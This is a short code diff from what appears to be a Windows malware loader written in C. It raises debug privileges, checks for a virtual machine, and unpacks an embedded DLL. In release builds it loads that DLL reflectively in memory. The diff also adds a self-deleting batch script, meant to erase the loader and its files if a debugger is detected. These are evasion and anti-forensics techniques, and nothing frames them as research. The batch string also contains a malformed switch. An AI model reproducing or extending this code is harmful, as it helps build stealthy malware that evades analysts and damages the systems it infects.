@@ -20,17 +20,16 @@ INT WINAPI wWinMain(
 	fnAdjustPrivilege(SE_DEBUG_NAME, TRUE);
 	BOOL bVM = fnCheckVMPresent();
 
-	fnAllocConsole();
+	fnInitializeXSR();
+	fnOpenConsole();
 
 	SIZE_T nDll;
 	PVOID pDll = fnUnpackResource(L"_rift.KEY", IDR_RIFTDLL, &nDll);
 	if (!pDll)
 		return 0x1;
 
-	/* "Reflective DLL loading will only be used in the release build "
-
-	*/
 #ifndef _DEBUG
+	// "Reflective" DLL loading will only be used in the release build
 	HMEMORYMODULE hDll = MemoryLoadLibrary(pDll, nDll);
 	if (!hDll)
 		return 0x2;
@@ -59,6 +58,13 @@ INT WINAPI wWinMain(
 	all traces of it self (the loader and everything else it extracts).
 	It should get triggered ( / called) if any fatal error occurs,
 	or the loader catches any suspicious activities (e.g. debuggers).  */
+const BYTE szSelfDelBat[] = {
+	"@echo off\n%s:\n\
+	del \"%s\" /f\
+	\tif exist \"%s\" (\n\
+	\t\tgoto %s\n\t)\n\
+	del \"%s\" / f"
+};
 VOID fnPurge() {
 
 }
